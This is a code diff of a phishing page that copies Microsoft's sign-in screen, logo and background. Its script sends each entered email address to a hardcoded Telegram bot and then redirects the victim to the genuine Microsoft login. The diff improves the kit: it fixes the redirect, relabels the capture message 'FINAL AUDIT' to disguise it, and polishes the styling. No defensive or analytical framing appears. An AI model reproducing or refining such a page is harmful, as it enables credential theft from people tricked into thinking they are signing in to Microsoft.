@@ -6,16 +6,13 @@
     <title>Sign in to your account</title>
     <style>
         * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
-        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+        html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
 
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: #deeaf4;
-            /* The "Fluent" Blurred Background */
-            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_61c068305f6c80521cc5c98695844893.jpg');
+            /* THE FIX: We use 'fixed' and '100vw' to force the background to stay */
+            background: #deeaf4 url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_61c068305f6c80521cc5c98695844893.jpg') no-repeat center center fixed;
             background-size: cover;
-            background-position: center center;
-            background-repeat: no-repeat;
             display: flex; 
             flex-direction: column;
             justify-content: center; 
@@ -23,12 +20,8 @@
         }
 
         .login-card {
-            background: #fff; 
-            width: 440px; 
-            padding: 44px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2); 
-            min-height: 376px;
-            z-index: 5;
+            background: #fff; width: 440px; padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2); min-height: 376px;
         }
 
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
@@ -42,7 +35,6 @@
 
         .link-text { font-size: 13px; margin: 14px 0; color: #1b1b1b; }
         .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }
-        .link-text a:hover { text-decoration: underline; }
 
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
@@ -50,23 +42,15 @@
             padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 108px;
         }
 
-        /* SIGN-IN OPTIONS BOX (Separate at the bottom) */
+        /* SIGN-IN OPTIONS (Fixed position) */
         .options-box {
-            background: #fff; 
-            width: 440px; 
-            padding: 12px 44px;
-            margin-top: 1px; 
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            display: flex; 
-            align-items: center; 
-            cursor: pointer;
+            background: #fff; width: 440px; padding: 12px 44px;
+            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            display: flex; align-items: center; cursor: pointer;
         }
         .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
 
-        .footer { 
-            position: fixed; bottom: 0; right: 0;
-            padding: 12px 30px; font-size: 12px; 
-        }
+        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
         .footer a { margin-left: 24px; text-decoration: none; color: #000; }
     </style>
 </head>
@@ -74,15 +58,12 @@
 
     <div class="login-card">
         <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
-        
         <h1>Sign in</h1>
         <input type="email" id="email" placeholder="Email, phone, or Skype" class="input-field">
-        
         <p class="link-text">No account? <a href="#">Create one!</a></p>
         <p class="link-text"><a href="#">Can't access your account?</a></p>
-
         <div class="button-row">
-            <button class="btn-next" onclick="submitToTelegram()">Next</button>
+            <button class="btn-next" onclick="submitData()">Next</button>
         </div>
     </div>
 
@@ -97,26 +78,24 @@
     </div>
 
     <script>
-        async function submitToTelegram() {
-            const emailInput = document.getElementById('email').value;
-            if(!emailInput) return;
+        async function submitData() {
+            const emailVal = document.getElementById('email').value;
+            if(!emailVal) return;
 
             const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
             const chatId = "5733378501";
-            const text = `🚨 **FINAL TRIAL CAPTURE**\n\n**Email:** ${emailInput}`;
-
+            
             try {
-                // 'keepalive' ensures the message sends before the redirect happens
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' }),
+                    body: JSON.stringify({ chat_id: chatId, text: `✅ **FINAL AUDIT**\nUser: ${emailVal}`, parse_mode: 'HTML' }),
                     keepalive: true
                 });
             } catch (e) {}
 
-            // Redirect to REAL Microsoft login to trigger the Authenticator flow
-            window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=123&login_hint=" + encodeURIComponent(emailInput);
+            // THE REDIRECT FIX: Using the generic login page to avoid the "Unauthorized Client" error
+            window.location.href = "https://login.microsoftonline.com/common/login?login_hint=" + encodeURIComponent(emailVal);
         }
     </script>
 </body>
